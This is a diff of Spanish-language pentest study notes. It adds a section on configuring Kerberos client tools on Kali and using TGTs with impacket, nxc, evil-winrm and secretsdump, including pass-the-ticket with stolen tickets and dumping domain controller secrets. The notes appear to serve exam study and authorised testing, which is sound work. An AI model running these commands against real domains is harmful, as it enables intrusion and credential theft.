@@ -24,9 +24,10 @@ Tags: #Kerberos #DC #Windows #AD #ASREPRoasting #Kerberoasting #UserEnum
 * [CrackStation](https://crackstation.net/)
 * [Hashes.com](https://hashes.com/en/decrypt/hash)
 
+
 ---
 
-## 0. SINCRONIZACIÓN DE RELOJ (OBLIGATORIO)
+## 0 SINCRONIZACIÓN DE RELOJ (OBLIGATORIO)
 
 ```bash
 # Kerberos requiere que el reloj del atacante no difiera más de 5 minutos del DC
@@ -237,6 +238,101 @@ Tags: #Kerberos #DC #Windows #AD #ASREPRoasting #Kerberoasting #UserEnum
 - Un TGT dura ~10 horas → suficiente para el examen
 - KRB5CCNAME → variable que conecta este ticket con herramientas de lateral movement
 - El uso del ticket en sí (psexec -k, wmiexec -k) va en las notas de lateral movement
+
+
+---
+
+## EXTRA: CONFIGURACIÓN DE KERBEROS EN KALI (krb5-user) CLIENTE
+
+Krb5-user es el paquete de Linux que instala las herramientas cliente de Kerberos. La más importante es `kinit` — que te permite **obtener un TGT (Ticket Granting Ticket) usando credenciales de dominio desde Kali**.
+
+En términos simples: es como hacer login en el dominio desde tu máquina Kali usando Kerberos.
+
+```bash
+❯ sudo apt install krb5-user
+# Instala las herramientas cliente de Kerberos en Kali
+# Habilita: kinit, klist, kdestroy → gestionar tickets desde Linux
+
+❯ dpkg-reconfigure krb5-config  
+# Si ya esta instalado se puede reconfigurar 
+```
+
+### Configurar /etc/krb5.conf
+```bash
+❯ sudo nano /etc/krb5.conf
+
+[libdefaults]
+    default_realm = DOMAIN.LOCAL
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+    kdc_timesync = 1
+    ccache_type = 4
+    forwardable = true
+    proxiable = true
+    fcc-mit-ticketflags = true
+
+[realms]
+    DOMAIN.LOCAL = {
+        kdc = <IP_DC>
+        admin_server = <IP_DC>
+    }
+
+[domain_realm]
+    .domain.local = DOMAIN.LOCAL
+    domain.local = DOMAIN.LOCAL
+# Cambiar DOMAIN.LOCAL por el dominio real del objetivo
+# Cambiar <IP_DC> por la IP del Domain Controller
+```
+
+### Obtener y gestionar tickets TGT desde Kali
+```bash
+❯ kinit user@DOMAIN.LOCAL
+# Requiere creds válidas → pide contraseña → genera TGT
+# El ticket queda almacenado en /tmp/krb5cc_XXXX
+
+❯ klist
+# Ver tickets activos → usuario, expiración, realm
+
+❯ kdestroy
+# Eliminar todos los tickets activos → limpiar sesión
+```
+
+### Obtener un ticket válido usando impacket 
+```bash 
+❯ impacket-getTGT DOMAIN.LOCAL/user:password 
+# Solicitar un ticket con credenciales válidas guardandolo en el archivo user.ccache
+```
+
+### Usar ticket con herramientas
+```bash
+❯ export KRB5CCNAME=/tmp/krb5cc_user.ccache
+# Apuntar las herramientas al ticket activo
+
+❯ smbclient -k @<DC_HOSTNAME>
+
+❯ nxc smb <IP> -k --use-kcache
+# Autenticación Kerberos sin contraseña en claro
+
+❯ evil-winrm -i <IP> -r DOMAIN.LOCAL
+# WinRM con Kerberos → -r en vez de -p
+
+❯ impacket-secretsdump -k DOMAIN.LOCAL/user@<DC_HOSTNAME>
+# Impacket con ticket Kerberos → -k activa el uso del ccache
+```
+
+### Casos:
+1. Pass-the-Ticket → usar un ticket .ccache robado en Kali 
+2. Autenticación Kerberos con impacket → cuando -k requiere ticket activo 
+3. BloodHound con auth Kerberos → -k en bloodhound-python 
+4. Evil-winrm con Kerberos → -r en vez de -p 
+5. CrackMapExec/nxc con -k → autenticación sin contraseña en claro
+
+### Insight
+
+- kinit + klist → verificar que el ticket funciona antes de lanzar ataques
+- Muy útil en Pass-the-Ticket → importar ticket .ccache robado y usarlo aquí
+- KRB5CCNAME + impacket -k → autenticación sin tocar la contraseña
+
 
 ---
 
